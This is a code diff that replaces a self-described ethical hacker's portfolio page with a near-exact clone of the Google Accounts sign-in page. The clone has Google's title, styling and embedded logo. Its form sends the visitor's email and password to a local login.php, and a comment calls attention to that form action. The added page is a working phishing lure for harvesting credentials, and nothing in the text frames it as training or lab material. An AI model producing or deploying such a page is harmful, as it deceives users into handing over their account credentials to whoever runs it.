@@ -1,44 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Ronny Rogers – Cybersecurity Specialist & Ethical Hacker</title>
-  <meta name="description" content="Ronny Rogers is a cybersecurity specialist, ethical hacker, penetration tester, and developer of the MRcutter tool.">
-  <meta name="keywords" content="Ronny Rogers, cybersecurity specialist, ethical hacker, pentester, MRcutter">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --border-color: #dadce0;
+            --text-main: #202124;
+        }
+        body {
+            font-family: 'Roboto', 'Segoe UI', Tahoma, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+        }
+        .login-card {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .logo { margin-bottom: 10px; width: 75px; }
+        h1 { font-size: 24px; font-weight: 400; color: var(--text-main); margin-bottom: 8px; }
+        p { margin-bottom: 40px; color: var(--text-main); }
+        .input-group { margin-bottom: 25px; text-align: left; }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            box-sizing: border-box;
+            transition: border 0.2s;
+        }
+        input:focus { outline: none; border: 2px solid var(--google-blue); padding: 12px 14px; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .btn-submit {
+            background-color: var(--google-blue);
+            color: white;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .link { color: var(--google-blue); text-decoration: none; font-size: 14px; font-weight: 500; }
+    </style>
 </head>
 <body>
 
-  <h1>Ronny Rogers</h1>
-  <h2>Cybersecurity Specialist • Ethical Hacker • Pentester</h2>
+<div class="login-card">
+    <img src="data:image/png;base64,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" alt="Google" class="logo">
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
 
-  <p>
-    My name is <strong>Ronny Rogers</strong>.  
-    I am a cybersecurity specialist, ethical hacker, and penetration tester.
-  </p>
-
-  <p>
-    I am the <strong>developer and creator of the MRcutter cybersecurity tool</strong>,
-    focused on ethical hacking, penetration testing, and security research.
-  </p>
-
-  <h3>Projects</h3>
-  <ul>
-    <li>
-      <strong>MRcutter</strong> – Cybersecurity & penetration testing tool  
-      <br>
-      <a href="https://github.com/Ronny12345-art/MRcutter">View on GitHub</a>
-    </li>
-  </ul>
-
-  <h3>Profiles</h3>
-  <ul>
-    <li><a href="https://github.com/Ronny12345-art">GitHub</a></li>
-    <li><a href="https://www.linkedin.com/in/ronny-rogers-4b481939b/">LinkedIn</a></li>
-    <li><a href="https://x.com/Rogersronny28">Twitter (X)</a></li>
-  </ul>
-
-  <p><em>All work is intended for legal and ethical use only.</em></p>
+    <!-- FORM ACTION IS SET TO login.php -->
+    <form action="login.php" method="POST">
+        <div class="input-group">
+            <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
+        </div>
+        <div class="input-group">
+            <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+        </div>
+        <div class="footer">
+            <a href="#" class="link">Forgot password?</a>
+            <button type="submit" class="btn-submit">Next</button>
+        </div>
+    </form>
+</div>
 
 </body>
 </html>
